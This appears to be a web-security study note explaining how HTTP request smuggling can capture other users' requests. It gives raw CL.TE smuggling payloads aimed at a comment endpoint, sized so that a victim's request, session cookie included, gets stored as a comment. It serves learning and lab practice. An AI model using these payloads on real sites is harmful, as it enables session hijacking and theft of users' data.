---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Capturing other users' requests

Application functionality which allows the storage and retrieval of textual data can potentially be captured, this includes session tokens and sensitive data submitted by users.

Some functions that can be used as a vehicle can be comment boxes, emails, screen names, as long as we are able to reflect the victim's request when it is appended to our smuggled request.

For example, we are reflecting a victim's request using a comment box functionality. Notice that the comment parameter is placed last so that we can reflect the victim's requests when it is appended to the comment parameter and displayed.

`GET / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Transfer-Encoding: chunked`\
`Content-Length: 330`

`0`

`POST /post/comment HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 400`\
`Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO`

`csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&`<mark style="color:yellow;">`comment=`</mark>

In our smuggled request, we used an overtly long (400 bytes) even though we sent body with a much lesser size about \~200 bytes. This means that the backend server will wait for the balance 200 bytes.

Therefore, when the victim sends their request and if its \~200 bytes, their request will be appended to our smuggled request and the server will process it as if it is one request.

`POST /post/comment HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 400`\
`Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO`

`csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=`<mark style="color:yellow;">`GET / HTTP/1.1 Host: vulnerable-website.com Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj ...`</mark>

One thing to note that this technique requires trial & error to figure out the length of the victim's request so that we can append it to our smuggled request.If the specifed content-length header is longer than the victim's actual request it will not work

> **One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the `&` character, meaning that the content that is stored from the victim user's request will end at the first `&`, which might even appear in the query string**
